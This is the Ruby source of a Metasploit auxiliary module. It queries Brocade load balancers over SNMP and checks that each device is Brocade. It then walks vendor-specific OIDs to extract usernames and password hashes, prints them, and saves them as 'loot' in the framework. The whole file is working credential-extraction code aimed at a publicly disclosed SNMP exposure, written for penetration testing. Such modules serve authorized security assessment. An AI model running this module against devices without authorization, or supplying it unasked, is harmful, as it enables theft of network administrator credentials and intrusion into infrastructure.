##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'English'
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Brocade Password Hash Enumeration',
      'Description' => %q{
        This module extracts password hashes from certain Brocade load
        balancer devices.
      },
      'References' => [
        [ 'URL', 'http://web.archive.org/web/20220819052410/https://www.rapid7.com/blog/post/2014/05/15/r7-2014-01-r7-2014-02-r7-2014-03-disclosures-exposure-of-critical-information-via-snmp-public-community-string/' ]
      ],
      'Author' => ['Deral "PercentX" Heiland'],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )
  end

  def run_host(ip)
    snmp = connect_snmp

    value = snmp.get_value('sysDescr.0')

    unless value =~ /Brocade/
      print_error("#{ip} - System is not Brocade: #{value}")
      return
    end

    @users = []
    snmp.walk('1.3.6.1.4.1.1991.1.1.2.9.2.1.1') do |row|
      row.each { |val| @users << val.value.to_s }
    end

    @hashes = []
    snmp.walk('1.3.6.1.4.1.1991.1.1.2.9.2.1.2') do |row|
      row.each { |val| @hashes << val.value.to_s }
    end

    print_good("#{ip} - Found user and password hashes:")

    credinfo = ''
    @users.each_index do |i|
      credinfo << "#{@users[i]}:#{@hashes[i]}" << "\n"
      print_good("#{@users[i]}:#{@hashes[i]}")
    end

    # Woot we got loot.
    loot_name = 'brocade.hashes'
    loot_type = 'text/plain'
    loot_filename = 'brocade_hashes.txt'
    loot_desc = 'Brocade username and password hashes'
    p = store_loot(
      loot_name,
      loot_type,
      datastore['RHOST'],
      credinfo,
      loot_filename,
      loot_desc
    )
    print_status("Credentials saved: #{p}")
  rescue ::SNMP::UnsupportedVersion => e
    vprint_error("#{ip} - #{e.message}")
  rescue ::SNMP::RequestTimeout => e
    vprint_error("#{ip} - #{e.message}")
  rescue ::Interrupt
    raise $ERROR_INFO
  rescue StandardError => e
    print_error("#{ip} - Error: #{e.class} #{e}")
    disconnect_snmp
  end
end
